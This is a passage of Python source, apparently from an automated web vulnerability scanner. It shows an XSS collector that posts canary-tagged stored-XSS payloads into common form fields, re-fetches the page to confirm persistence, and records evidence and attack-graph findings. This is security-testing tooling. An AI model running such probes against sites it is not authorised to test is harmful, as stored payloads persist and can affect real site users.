                            detected_evidence.append(ev)
                            break

            # -------------------------------------------------------------
            # Vector 5: Stored XSS Stateful Testing (POST-then-GET)
            # -------------------------------------------------------------
            stored_canary = self.generator.generate_canary("stored")
            stored_payload = self.generator.get_stored_payload(stored_canary)
            stored_post_data = {
                "comment": stored_payload,
                "message": stored_payload,
                "content": stored_payload,
                "text": stored_payload,
                "feedback": stored_payload,
                "name": stored_payload,
            }

            post_resp = self._execute_request(raw_mission, "POST", orig_url, data=stored_post_data, headers=headers_data)
            if post_resp:
                # Re-fetch page via GET to check persistence
                get_resp = self._execute_request(raw_mission, "GET", orig_url, headers=headers_data)
                analysis = self.analyzer.analyze_stored(get_resp, stored_canary, stored_payload)
                if analysis:
                    vuln_key = f"{parsed_url.path}:stored:xss-stored"
                    if vuln_key not in confirmed_vuln_keys:
                        confirmed_vuln_keys.add(vuln_key)
                        ev = self._create_evidence_and_update_state(
                            mission=mission,
                            target_url=orig_url,
                            base_url=base_url,
                            param="comment",
                            param_type="stored_post",
                            payload=stored_payload,
                            status_code=getattr(get_resp, "status_code", 200) or 200,
                            analysis=analysis,
                        )
                        detected_evidence.append(ev)

        logger.info(f"XSSCollector complete: {len(detected_evidence)} XSS vulnerability(ies) identified.")
        return detected_evidence

    def _create_evidence_and_update_state(
        self,
        mission: Any,
        target_url: str,
        base_url: str,
        param: str,
        param_type: str,
        payload: str,
        status_code: int,
        analysis: Dict[str, Any],
        **kwargs,
    ) -> Evidence:
        """
        Constructs Evidence, appends to mission.evidence & mission.vulnerabilities,
        and expands the KnowledgeGraph attack surface with HAS_ENDPOINT and HAS_VULNERABILITY edges.
        """
        raw_mission = getattr(mission, "_mission", mission)
        template_id = analysis.get("template_id", "xss")
        xss_type = analysis.get("xss_type", "reflected")
        context = analysis.get("context", "html_body")
        severity = analysis.get("severity", "critical" if xss_type == "stored" else "high")
        confidence = analysis.get("confidence", 0.95)
        snippet = analysis.get("snippet", "")

        parsed_url = urllib.parse.urlparse(target_url)
        url_path = parsed_url.path or "/"

        type_label = "Stored XSS" if xss_type == "stored" else f"Reflected XSS ({context})"
        title = f"Cross-Site Scripting ({type_label}): {param} on {target_url}"
        description = (
            f"Cross-Site Scripting ({type_label}) vulnerability confirmed on endpoint {target_url} "
            f"via {param_type} parameter '{param}' using payload '{payload}'. "
            f"Evidence: {snippet[:200]}"
        )

        ev = Evidence(
            mission_id=getattr(raw_mission, "id", ""),
            source_type="LOG",
            created_by="SYSTEM_GENERATED",
            title=title,
            description=description,
            category="xss",
            value=target_url,
            source=target_url,
            status="CONFIRMED",
            confidence=confidence,
            severity=severity,
            provenance=ProvenanceData(
                step_id="xss_collector",
            ),
            tags=["xss", "cross_site_scripting", xss_type, context, template_id],
            metadata={
                "url": target_url,
                "host": base_url,
                "path": url_path,
                "parameter": param,
                "parameter_type": param_type,
                "payload": payload,
                "category": "xss",
                "severity": severity,
                "xss_type": xss_type,
                "context": context,
                "template_id": template_id,
                "status_code": status_code,
                "evidence_snippet": snippet[:250],
            },
        )

        # 1. Add to raw_mission.evidence
        if hasattr(raw_mission, "evidence") and raw_mission.evidence is not None:
            if hasattr(raw_mission.evidence, "add"):
                raw_mission.evidence.add(ev)
            elif isinstance(raw_mission.evidence, list):
                raw_mission.evidence.append(ev)

        # 2. Add to raw_mission.vulnerabilities
        if hasattr(raw_mission, "vulnerabilities") and isinstance(raw_mission.vulnerabilities, list):
            raw_mission.vulnerabilities.append({
                "name": f"Cross-Site Scripting ({type_label})",
                "template_id": template_id,
                "severity": severity,
                "host": base_url,
                "url": target_url,
                "description": description,
                "parameter": param,
                "parameter_type": param_type,
                "payload": payload,
                "xss_type": xss_type,
                "context": context,
            })

        # 3. KnowledgeGraph Node & Edge Expansion
        graph = getattr(raw_mission, "attack_surface_graph", None) or getattr(raw_mission, "graph", None)
        if graph is not None and hasattr(graph, "add") and hasattr(graph, "connect"):
            lh_id = f"live_host:{base_url}"
            ep_id = f"endpoint:{target_url}"
            vuln_id = f"vulnerability:{template_id}:{target_url}:{param}"

            graph.add(Node(id=lh_id, type="live_host", value=base_url, metadata={"url": base_url}))
            graph.add(Node(id=ep_id, type="endpoint", value=target_url, metadata={"url": target_url, "status_code": status_code}))
            graph.add(Node(id=vuln_id, type="vulnerability", value=f"Cross-Site Scripting ({type_label})", metadata=ev.metadata))

            graph.connect(lh_id, ep_id, edge_type="HAS_ENDPOINT")
            graph.connect(lh_id, vuln_id, edge_type="HAS_VULNERABILITY")
            graph.connect(ep_id, vuln_id, edge_type="HAS_VULNERABILITY")

        # 4. Safe publish to ControlledMission wrapper
        if mission is not raw_mission and hasattr(mission, "publish_finding"):
            try:
                mission.publish_finding(ev.id, ev)
            except Exception:
                pass

        return ev

    def execute(self, mission: Any) -> List[Evidence]:
        """Plugin / Specialist adapter interface."""
        return self.collect(mission)
